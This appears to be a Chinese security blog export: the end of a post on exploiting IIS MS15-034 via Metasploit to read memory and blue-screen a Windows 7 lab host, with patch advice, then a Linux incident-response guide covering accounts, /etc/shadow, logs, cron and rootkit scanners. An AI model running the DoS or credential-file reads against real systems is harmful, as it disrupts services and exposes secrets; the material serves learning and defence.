<h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><h2 id="1、ms15-034内存读取"><a href="#1、ms15-034内存读取" class="headerlink" title="1、ms15_034内存读取"></a>1、ms15_034内存读取</h2><p>打开msfconsole，搜索ms15_034</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650277987544-0590ccba-4ff9-4b8e-9ed7-76373bc1e861.png" alt="img"></p>
<p>利用ms15_034漏洞读取服务器内存数据：不知道为什么没有显示内存数据……</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650278085313-17dba631-2c52-4022-bfb6-17d47d5e6eb8.png" alt="img"></p>
<h2 id="2、ms15-034-ddos攻击"><a href="#2、ms15-034-ddos攻击" class="headerlink" title="2、ms15_034 ddos攻击"></a>2、ms15_034 ddos攻击</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650278317752-4f992f5d-7d8f-42e7-b3dc-90615aa46aa4.png" alt="img"></p>
<p>攻击成功：windows7蓝屏，蓝屏后会自动重启</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650278270618-68521767-f8b8-4a08-ab58-7b4fa853bc8d.png" alt="img"></p>
<h1 id="五、漏洞防御"><a href="#五、漏洞防御" class="headerlink" title="五、漏洞防御"></a>五、漏洞防御</h1><p>禁用IIS的内核缓存：可能导致IIS性能降低</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650278918405-879949e3-3fdb-4e9f-8370-aa0cb402af15.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650278952579-2f467d65-3bda-4265-9b32-6b1114aee6d9.png" alt="img"></p>
<p>缓解方案：<a href="https://technet.microsoft.com/en-us/library/cc731903(v=ws.10).aspx">https://technet.microsoft.com/en-us/library/cc731903(v=ws.10).aspx</a></p>
<p>升级补丁：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034?redirectedfrom=MSDN</a></p>
<p>双击输出缓存中的办法：<a href="https://blog.csdn.net/u010082526/article/details/84955085">https://blog.csdn.net/u010082526/article/details/84955085</a></p>
<h1 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h1><p><a href="https://blog.csdn.net/qq_41210745/article/details/103437683">https://blog.csdn.net/qq_41210745/article/details/103437683</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>中间件漏洞</tag>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux入侵排查</title>
    <url>/post/af6fba30.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 </p>
<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p>
<h1 id="二、入侵排查思路"><a href="#二、入侵排查思路" class="headerlink" title="二、入侵排查思路"></a>二、入侵排查思路</h1><h2 id="1、账号安全"><a href="#1、账号安全" class="headerlink" title="1、账号安全"></a>1、账号安全</h2><h3 id="（1）基本使用"><a href="#（1）基本使用" class="headerlink" title="（1）基本使用"></a>（1）基本使用</h3><h4 id="①-用户信息文件"><a href="#①-用户信息文件" class="headerlink" title="① 用户信息文件"></a>① 用户信息文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]<span class="comment"># cat /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br></pre></td></tr></table></figure>

<h4 id="②-影子文件"><a href="#②-影子文件" class="headerlink" title="② 影子文件"></a>② 影子文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE<span class="variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure>

<h4 id="③-常用命令"><a href="#③-常用命令" class="headerlink" title="③ 常用命令"></a>③ 常用命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">who     查看当前登录用户（tty 本地登陆  pts 远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure>

<h3 id="（2）入侵排查"><a href="#（2）入侵排查" class="headerlink" title="（2）入侵排查"></a>（2）入侵排查</h3><h4 id="①-查询特权用户特权用户-uid-为0"><a href="#①-查询特权用户特权用户-uid-为0" class="headerlink" title="① 查询特权用户特权用户(uid 为0)"></a>① 查询特权用户特权用户(uid 为0)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;$3==0&#123;print $1&#125;&#x27;</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">将/etc/passwd文件内容以:为分割符，过滤出第3列（即uid）为0的第1列（用户名）的数据</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648716510121-e0e46479-ff73-477e-8fbc-f6bc41070d37.png" alt="img"></p>
<h4 id="②-查询可以远程登录的帐号信息"><a href="#②-查询可以远程登录的帐号信息" class="headerlink" title="② 查询可以远程登录的帐号信息"></a>② 查询可以远程登录的帐号信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line"></span><br><span class="line">/etc/shadow文件内容中，筛选出一行中包含<span class="variable">$1</span>或<span class="variable">$6</span>的的行数据</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648716993939-9c3d734b-67f9-4e35-85c1-30bc317ae60d.png" alt="img"></p>
<h4 id="③-除root帐号外，其他帐号是否存在sudo权限"><a href="#③-除root帐号外，其他帐号是否存在sudo权限" class="headerlink" title="③ 除root帐号外，其他帐号是否存在sudo权限"></a>③ 除root帐号外，其他帐号是否存在sudo权限</h4><p>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line"></span><br><span class="line">grep -v 反转查找，输出除匹配项之外的所有行，这里的匹配项是<span class="comment">#或$开头的，主要是为了去除掉root</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1648718034757-f3679580-42e0-492c-8421-68c855cbc91a.png" alt="img"></p>
<h4 id="④-禁用或删除多余及可疑的帐号"><a href="#④-禁用或删除多余及可疑的帐号" class="headerlink" title="④ 禁用或删除多余及可疑的帐号"></a>④ 禁用或删除多余及可疑的帐号</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class="line">userdel user       删除 user 用户</span><br><span class="line">userdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure>

<h2 id="2、历史命令"><a href="#2、历史命令" class="headerlink" title="2、历史命令"></a>2、历史命令</h2><h3 id="（1）基本使用-1"><a href="#（1）基本使用-1" class="headerlink" title="（1）基本使用"></a>（1）基本使用</h3><h4 id="①-root用户的历史命令"><a href="#①-root用户的历史命令" class="headerlink" title="① root用户的历史命令"></a>① root用户的历史命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br><span class="line">cat /root/.bash_history</span><br></pre></td></tr></table></figure>

<h4 id="②-查看-bash-history文件查看帐号执行过的系统命令"><a href="#②-查看-bash-history文件查看帐号执行过的系统命令" class="headerlink" title="② 查看.bash_history文件查看帐号执行过的系统命令"></a>② 查看<code>.bash_history</code>文件查看帐号执行过的系统命令</h4><p>打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /root/username/.bash_history</span><br></pre></td></tr></table></figure>

<p><strong>【保存1万条命令】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27;</span> /etc/profile</span><br><span class="line"></span><br><span class="line">利用 sed 把HISTSIZE=1000替换成HISTSIZE=10000</span><br></pre></td></tr></table></figure>

<p><strong>【在/etc/profile的文件尾部添加如下行数配置信息】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">######jiagu history xianshi#########</span></span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$USER_IP</span>&quot;</span> = <span class="string">&quot;&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">USER_IP=`hostname`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">export</span> HISTTIMEFORMAT=<span class="string">&quot;%F %T <span class="variable">$USER_IP</span> `whoami` &quot;</span></span><br><span class="line"><span class="built_in">shopt</span> -s histappend</span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;history -a&quot;</span></span><br><span class="line"><span class="comment">######### jiagu history xianshi ##########</span></span><br></pre></td></tr></table></figure>

<p><strong>【source /etc/profile 让配置生效】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]<span class="comment"># source /etc/profile</span></span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># history</span></span><br><span class="line"></span><br><span class="line">生成效果： </span><br><span class="line">1  2018-07-10 19:45:39 192.168.204.1 root <span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<p>历史操作命令的清除：<code>history -c</code></p>
<p>但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</p>
<h3 id="（2）入侵排查-1"><a href="#（2）入侵排查-1" class="headerlink" title="（2）入侵排查"></a>（2）入侵排查</h3><p>进入用户目录下，导出历史命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure>

<h2 id="3、检查异常端口"><a href="#3、检查异常端口" class="headerlink" title="3、检查异常端口"></a>3、检查异常端口</h2><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></table></figure>

<p>查看下 pid 所对应的进程文件路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -l /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">或</span><br><span class="line">file /proc/<span class="variable">$PID</span>/exe（<span class="variable">$PID</span> 为对应的 pid 号）</span><br></pre></td></tr></table></figure>

<h2 id="4、检查异常进程"><a href="#4、检查异常进程" class="headerlink" title="4、检查异常进程"></a>4、检查异常进程</h2><p>使用 ps 命令，分析进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep pid</span><br><span class="line"></span><br><span class="line">a 显示现行终端机下的所有程序，包括其他用户的程序。</span><br><span class="line">u 以用户为主的格式来显示程序状况。</span><br><span class="line">x 显示所有程序，不以终端机来区分。</span><br></pre></td></tr></table></figure>

<h2 id="5、检查开机启动项"><a href="#5、检查开机启动项" class="headerlink" title="5、检查开机启动项"></a>5、检查开机启动项</h2><h3 id="（1）基本使用-2"><a href="#（1）基本使用-2" class="headerlink" title="（1）基本使用"></a>（1）基本使用</h3><p>系统运行级别示意图：</p>
<table>
<thead>
<tr>
<th><strong>运行级别</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>关机</td>
</tr>
<tr>
<td>1</td>
<td>单用户模式，可以想象为windows的安全模式，主要用于系统修复</td>
</tr>
<tr>
<td>2</td>
<td>不完全的命令行模式，不含NFS服务</td>
</tr>
<tr>
<td>3</td>
<td>完全的命令行模式，就是标准字符界面</td>
</tr>
<tr>
<td>4</td>
<td>系统保留</td>
</tr>
<tr>
<td>5</td>
<td>图形模式</td>
</tr>
<tr>
<td>6</td>
<td>重启动</td>
</tr>
</tbody></table>
<p>查看运行级别命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runlevel</span><br></pre></td></tr></table></figure>

<p>系统默认允许级别</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/inittab</span><br><span class="line">id=3：initdefault  <span class="comment">#系统开机后直接进入哪个运行级别</span></span><br></pre></td></tr></table></figure>

<p>开机启动配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure>

<p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 <code>/etc/init.d</code> 目录下，然后在 <code>/etc/rc.d/rc*.d</code> 文件中建立软链接即可。</p>
<p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost ~]<span class="comment"># ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</span></span><br></pre></td></tr></table></figure>

<p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p>
<h3 id="（2）入侵排查-2"><a href="#（2）入侵排查-2" class="headerlink" title="（2）入侵排查"></a>（2）入侵排查</h3><p>启动项文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br><span class="line">ls -l /etc/rc.d/rc3.d/</span><br></pre></td></tr></table></figure>

<h2 id="6、检查定时任务"><a href="#6、检查定时任务" class="headerlink" title="6、检查定时任务"></a>6、检查定时任务</h2><h3 id="（1）基本使用-3"><a href="#（1）基本使用-3" class="headerlink" title="（1）基本使用"></a>（1）基本使用</h3><h4 id="①-利用-crontab-创建计划任务"><a href="#①-利用-crontab-创建计划任务" class="headerlink" title="① 利用 crontab 创建计划任务"></a>① 利用 crontab 创建计划任务</h4><p>基本命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line"></span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line"></span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line"></span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br><span class="line"></span><br><span class="line">如：*/1 * * * * <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure>

<h4 id="②-利用-anacron-命令实现异步定时任务调度"><a href="#②-利用-anacron-命令实现异步定时任务调度" class="headerlink" title="② 利用 anacron 命令实现异步定时任务调度"></a>② 利用 anacron 命令实现异步定时任务调度</h4><p>使用案例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">每天运行 /home/backup.sh 脚本：</span><br><span class="line">vi /etc/anacrontab </span><br><span class="line">@daily    10    example.daily   /bin/bash /home/backup.sh</span><br><span class="line">当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</span><br></pre></td></tr></table></figure>

<h3 id="（2）入侵排查-3"><a href="#（2）入侵排查-3" class="headerlink" title="（2）入侵排查"></a>（2）入侵排查</h3><p>重点关注以下目录中是否存在恶意脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>

<p>小技巧：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /etc/cron.daily/*  查看目录下所有文件</span><br></pre></td></tr></table></figure>

<h2 id="7、检查服务"><a href="#7、检查服务" class="headerlink" title="7、检查服务"></a>7、检查服务</h2><h3 id="（1）服务自启动"><a href="#（1）服务自启动" class="headerlink" title="（1）服务自启动"></a>（1）服务自启动</h3><p>第一种修改方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level  2345 httpd on  开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345）</span><br></pre></td></tr></table></figure>

<p>第二种修改方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修改 /etc/re.d/rc.local 文件  </span><br><span class="line">加入 /etc/init.d/httpd start</span><br></pre></td></tr></table></figure>

<p>第三种修改方法：使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p>
<h3 id="（2）入侵排查-4"><a href="#（2）入侵排查-4" class="headerlink" title="（2）入侵排查"></a>（2）入侵排查</h3><h4 id="①-查询已安装的服务"><a href="#①-查询已安装的服务" class="headerlink" title="① 查询已安装的服务"></a>① 查询已安装的服务</h4><p>RPM 包安装的服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br><span class="line"></span><br><span class="line">系统在3与5级别下的启动项 </span><br><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep <span class="string">&quot;3:启用\|5:启用&quot;</span></span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep <span class="string">&quot;3:on\|5:on&quot;</span></span><br></pre></td></tr></table></figure>

<p>源码包安装的服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在/user/<span class="built_in">local</span>/</span><br><span class="line">service httpd start</span><br><span class="line">搜索/etc/rc.d/init.d/  查看是否存在</span><br></pre></td></tr></table></figure>

<h2 id="8、检查异常文件"><a href="#8、检查异常文件" class="headerlink" title="8、检查异常文件"></a>8、检查异常文件</h2><ol>
<li>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</li>
<li>得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？<br>&emsp;&emsp;可以使用find命令来查找，如 <code>find /opt -iname &quot;*&quot; -atime 1 -type f</code> 找出 /opt 下一天前访问过的文件</li>
<li>针对可疑文件可以使用 stat 进行创建修改时间。</li>
</ol>
<h2 id="9、检查系统日志"><a href="#9、检查系统日志" class="headerlink" title="9、检查系统日志"></a>9、检查系统日志</h2><p>日志默认存放位置：<code>/var/log/</code></p>
<p>查看日志配置情况：<code>more /etc/rsyslog.conf</code></p>
<table>
<thead>
<tr>
<th><strong>日志文件</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>/var/log/cron</td>
<td>记录了系统定时任务相关的日志</td>
</tr>
<tr>
<td>/var/log/cups</td>
<td>记录打印信息的日志</td>
</tr>
<tr>
<td>/var/log/dmesg</td>
<td>记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td>/var/log/mailog</td>
<td>记录邮件信息</td>
</tr>
<tr>
<td>/var/log/message</td>
<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td>/var/log/btmp</td>
<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td>/var/log/lastlog</td>
<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
</tr>
<tr>
<td>/var/log/wtmp</td>
<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td>/var/log/utmp</td>
<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td>/var/log/secure</td>
<td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody></table>
<p>日志分析技巧：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/<span class="built_in">log</span>/secure|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/<span class="built_in">log</span>/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： 	</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> kali</span><br><span class="line"><span class="comment">#grep &quot;useradd&quot; /var/log/secure </span></span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user <span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group <span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group <span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line"><span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="keyword">for</span> user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>

<h1 id="三、工具篇"><a href="#三、工具篇" class="headerlink" title="三、工具篇"></a>三、工具篇</h1><h2 id="1、Rootkit查杀"><a href="#1、Rootkit查杀" class="headerlink" title="1、Rootkit查杀"></a>1、Rootkit查杀</h2><ul>
<li> chkrootkit：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a>  </li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line"><span class="built_in">cd</span> chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line"><span class="comment">#编译完成没有报错的话执行检查</span></span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure>

<ul>
<li> rkhunter：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a>  </li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line"><span class="built_in">cd</span> rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure>

<h2 id="2、病毒查杀"><a href="#2、病毒查杀" class="headerlink" title="2、病毒查杀"></a>2、病毒查杀</h2><ul>
<li>Clamav：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a><br>安装方式一：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、安装 zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line"><span class="built_in">cd</span> zlib-1.2.7</span><br><span class="line"><span class="comment">#安装一下gcc编译环境： yum install gcc</span></span><br><span class="line">CFLAGS=<span class="string">&quot;-O3 -fPIC&quot;</span> ./configure --prefix= /usr/<span class="built_in">local</span>/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组 clamav 和组成员 clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/<span class="literal">false</span> -c <span class="string">&quot;Clam AntiVirus&quot;</span> clamav</span><br><span class="line"></span><br><span class="line">3、安装 Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line"><span class="built_in">cd</span> clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/<span class="built_in">local</span>/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置 Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line"><span class="built_in">cd</span> /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure>

<p>安装方式二：  </p>
